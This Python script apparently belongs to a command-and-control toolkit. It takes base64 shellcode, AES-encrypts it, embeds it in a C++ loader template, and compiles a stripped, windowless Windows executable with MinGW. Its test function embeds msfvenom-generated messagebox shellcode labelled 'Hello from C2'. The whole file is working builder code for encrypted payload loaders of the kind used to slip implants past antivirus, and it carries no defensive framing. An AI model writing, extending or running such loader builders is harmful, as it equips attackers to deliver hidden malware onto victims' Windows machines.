#!/usr/bin/env python
import os
import base64
import subprocess
import logging
import time
import platform
import tempfile
from encrypt_aes import encrypt_shellcode

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Paths
CPP_TEMPLATE = os.path.join(os.path.dirname(__file__), "cpp_templates/shellcode_loader_template.cpp")
COMPILED_DIR = os.path.join(os.path.dirname(__file__), "compiled")
OUTPUT_CPP = os.path.join(COMPILED_DIR, "shellcode_loader.cpp")
OUTPUT_EXE = os.path.join(COMPILED_DIR, "shellcode_loader.exe")

def check_mingw():
    """Check if MinGW is installed"""
    try:
        # Try to run the compiler to see if it's installed
        subprocess.run(["x86_64-w64-mingw32-g++", "--version"], 
                      stdout=subprocess.PIPE, 
                      stderr=subprocess.PIPE,
                      check=False)
        return True
    except FileNotFoundError:
        return False

def generate_loader(shellcode_base64):
    """
    Generate a shellcode loader executable
    
    Args:
        shellcode_base64 (str): Base64 encoded shellcode
        
    Returns:
        str: Path to the compiled executable, or None if compilation failed
    """
    try:
        logging.info("Generating loader for shellcode...")
        logging.info(f"Shellcode length: {len(shellcode_base64)}")
        
        # Create compiled directory if it doesn't exist
        os.makedirs(COMPILED_DIR, exist_ok=True)
        
        # Decode base64 shellcode
        try:
            shellcode_bytes = base64.b64decode(shellcode_base64)
            logging.info(f"Decoded shellcode length: {len(shellcode_bytes)} bytes")
        except Exception as e:
            logging.error(f"Failed to decode base64 shellcode: {str(e)}")
            return None
        
        # Encrypt the shellcode
        try:
            encrypted_b64 = encrypt_shellcode(shellcode_bytes)
            logging.info(f"Encrypted shellcode length: {len(encrypted_b64)}")
            logging.info("Shellcode encrypted successfully")
        except Exception as e:
            logging.error(f"Failed to encrypt shellcode: {str(e)}")
            return None
        
        # Load template and replace placeholder with encrypted shellcode
        try:
            with open(CPP_TEMPLATE, "r") as f:
                template = f.read()
                
            loader_code = template.replace("###ENCRYPTED_SHELLCODE###", encrypted_b64)
            
            # Write the loader code to file
            with open(OUTPUT_CPP, "w") as f:
                f.write(loader_code)
            
            logging.info(f"Loader C++ code written to {OUTPUT_CPP}")
        except Exception as e:
            logging.error(f"Failed to generate loader source code: {str(e)}")
            return None
        
        # Check if MinGW is installed
        if not check_mingw():
            logging.error("MinGW compiler (x86_64-w64-mingw32-g++) not found!")
            logging.error("Please install MinGW to compile the loader.")
            
            # On Linux, suggest installation command
            if platform.system() == "Linux":
                logging.error("On Debian/Ubuntu: sudo apt-get install mingw-w64")
                logging.error("On Fedora: sudo dnf install mingw64-gcc-c++")
                
            return None
            
        # Compile to .exe using mingw-w64
        logging.info("Compiling loader with MinGW...")
        
        compile_cmd = [
            "x86_64-w64-mingw32-g++", 
            OUTPUT_CPP,
            "-o", OUTPUT_EXE,
            "-mwindows",
            "-s",  # Strip symbols
            "-static-libgcc", "-static-libstdc++",  # Static linking
        ]
        
        # Run compiler
        result = subprocess.run(
            compile_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if result.returncode != 0:
            error_msg = result.stderr.decode()
            logging.error(f"Compilation failed: {error_msg}")
            return None
            
        logging.info(f"Loader compiled successfully: {OUTPUT_EXE}")
        return OUTPUT_EXE
        
    except Exception as e:
        logging.error(f"Error generating loader: {str(e)}")
        return None
        
def test_generate_example():
    """Generate a test loader with simple shellcode"""
    # Simple messagebox shellcode for Windows x64
    # Generated with: msfvenom -p windows/x64/messagebox TEXT="Hello from C2" -f raw | base64
    test_shellcode = "2dXFkWTYX6n/1e3V7vL/1eXllgfXBk0H4tH/JJpEJ+Jm0SPHouJm7jKxXCfHs9cBRdLHAEXEx8fHAEUDx8fHGtcKTR7ij9tmdcOI2tXF7vKaQZpFmkSI2prioprX7knxZNrXBrFFx+7X7U0Dx+5N8tfu1wnpPiCxRcTS0/9mmkCaR5pGmkexXyTDmk2aTJpLNCfiZtEjx6LiZu6I2mZyw5ohoVQAZQB4AHQAIABNAGUAcwBzAGEAZwBlAABIAGUAbABsAG8AIABmAHIAbwBtACAAQwAyAAAAAA=="
    
    # Generate the loader
    exe_path = generate_loader(test_shellcode)
    
    if exe_path:
        print(f"Test loader generated at: {exe_path}")
    
if __name__ == "__main__":
    test_generate_example() 